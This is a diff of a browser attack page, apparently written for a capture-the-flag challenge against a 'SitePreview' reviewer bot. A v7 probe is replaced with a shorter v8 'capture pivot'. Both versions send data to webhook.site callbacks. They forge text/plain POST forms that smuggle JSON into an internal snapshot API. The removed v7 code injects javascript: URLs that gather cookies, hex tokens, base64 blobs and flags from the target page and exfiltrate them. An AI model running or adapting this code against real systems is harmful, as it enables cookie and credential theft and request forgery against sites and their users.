@@ -1,58 +1,7 @@
-<!doctype html>
-<html lang="en">
-<head><meta charset="utf-8"><title>SitePreview reviewer-context probe v7</title></head>
-<body>
-<h1>SitePreview reviewer-context probe v7</h1><pre id="output"></pre>
-<script>
-const callback = "https://webhook.site/63195811-1d56-47ad-bbc1-9598f721f419";
-const output = document.querySelector("#output");
-function report(event, value = "") {
-  output.textContent += `${event}: ${value}\n`;
-  const query = new URLSearchParams({event, value: String(value), time: new Date().toISOString()});
-  fetch(`${callback}?${query}`, {mode:"no-cors", credentials:"omit", cache:"no-store", keepalive:true}).catch(() => {});
-}
-function javascriptUrl(event) {
-  const endpoint = JSON.stringify(`${callback}?event=${event}&value=`);
-  return "javascript:(async()=>{try{" +
-    "const h=document.documentElement.outerHTML;" +
-    "const snapshot=()=>JSON.stringify({cookie:document.cookie,actions:[...new Set(h.match(/[0-9a-f]{42}/g)||[])],bounds:[...new Set(h.match(/[A-Za-z0-9+/]{120,}={0,2}/g)||[])].slice(0,12),flags:h.match(/hitcon\\{[^}]+\\}/ig)||[]});" +
-    "(new Image).src=" + endpoint + "+encodeURIComponent(snapshot());" +
-    "const f=document.querySelector('.capture-log-toolbar');if(f){f.requestSubmit();await new Promise(r=>setTimeout(r,700));const o=document.querySelector('.capture-log-output');const v=o&&(o.value||o.getAttribute('value'));if(v)(new Image).src=" + endpoint + "+encodeURIComponent('capture.log:'+v)}" +
-    "}catch(e){};void 0})()";
-}
-report("v7-start", JSON.stringify({userAgent:navigator.userAgent, webdriver:navigator.webdriver, referrer:document.referrer, opener:Boolean(window.opener), activation:navigator.userActivation && {active:navigator.userActivation.isActive, hasBeenActive:navigator.userActivation.hasBeenActive}}));
-const settingsWindow = window.open("http://web:3000/settings", "sitepreviewSettings");
-report("v7-settings-popup", settingsWindow ? "opened" : "blocked");
-
-// enctype=text/plain inserts '='. Keeping that byte inside a dummy JSON string
-// produces: {"url":"CALLBACK","ignored":"="}
-const snapshotWindow = window.open("about:blank", "sitepreviewSnapshot");
-const form = document.createElement("form");
-form.method = "POST";
-form.enctype = "text/plain";
-form.action = "http://web:3000/api/snapshot";
-form.target = "sitepreviewSnapshot";
-const input = document.createElement("input");
-input.name = `{"url":"${callback}?event=v7-snapshot-browser&value=visited","ignored":"`;
-input.value = '"}';
-form.append(input); document.body.append(form); form.submit();
-report("v7-snapshot-form", snapshotWindow ? "submitted-popup" : "submitted");
-
-setTimeout(() => {
-  if (!settingsWindow) return;
-  try { settingsWindow.location = javascriptUrl("v7-js-location-assignment"); report("v7-js-location-assignment-attempt", "assigned"); }
-  catch (error) { report("v7-js-location-assignment-attempt", `${error.name}:${error.message}`); }
-}, 500);
-setTimeout(() => {
-  try { const result = window.open(javascriptUrl("v7-js-window-open"), "sitepreviewSettings"); report("v7-js-window-open-attempt", result ? "returned-window" : "null"); }
-  catch (error) { report("v7-js-window-open-attempt", `${error.name}:${error.message}`); }
-}, 900);
-setTimeout(() => {
-  try { const anchor = document.createElement("a"); anchor.target = "sitepreviewSettings"; anchor.href = javascriptUrl("v7-js-anchor"); document.body.append(anchor); anchor.click(); report("v7-js-anchor-attempt", "clicked"); }
-  catch (error) { report("v7-js-anchor-attempt", `${error.name}:${error.message}`); }
-}, 1300);
-setTimeout(() => report("v7-complete", "yes"), 1800);
+<!doctype html><meta charset="utf-8"><title>SitePreview v8 capture pivot</title><pre id=o></pre><script>
+const C="https://webhook.site/b8f35f78-ccd0-4896-8820-98dfb638513e";
+function R(e,v=""){document.querySelector("#o").textContent+=e+":"+v+"\n";fetch(C+"?"+new URLSearchParams({event:e,value:String(v),at:Date.now()}),{mode:"no-cors",cache:"no-store",keepalive:true}).catch(()=>{})}
+function S(u,n){let f=document.createElement("form"),i=document.createElement("input");f.method="POST";f.enctype="text/plain";f.action="http://web:3000/api/snapshot";f.target=n;i.name='{"url":'+JSON.stringify(u)+',"ignored":"';i.value='"}';f.append(i);document.body.append(f);open("about:blank",n);f.submit();R("v8-submit",u)}
+R("v8-start",JSON.stringify({ua:navigator.userAgent,w:navigator.webdriver,c:document.cookie}));
+S("https://is.gd/hAnzFM","v8p");setTimeout(()=>S("http://web:3000/settings","v8s"),120);setTimeout(()=>R("v8-done","1"),1900)
 </script>
-</body>
-</html>
-
